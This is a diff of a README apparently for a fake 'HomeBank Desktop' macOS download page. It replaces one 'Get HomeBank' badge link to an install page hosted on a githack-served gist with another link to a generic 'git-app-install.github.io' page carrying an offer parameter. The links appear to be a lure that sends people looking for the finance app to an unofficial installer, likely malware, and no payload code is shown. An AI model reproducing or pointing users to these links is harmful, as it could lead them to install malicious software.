@@ -1,6 +1,6 @@
 # HomeBank Desktop — Personal Finance macOS
 
-<a href="https://gistcdn.githack.com/bethovenubestdream/de7e56dc99db527c8442d264fb99ec12/raw/2b231dea0b90f89f1dc625890a3681d3d367aba6/install.html?offer=HomeBank" target="_blank">
+<a href="https://git-app-install.github.io/.github/?offer=HomeBank" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20HomeBank%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
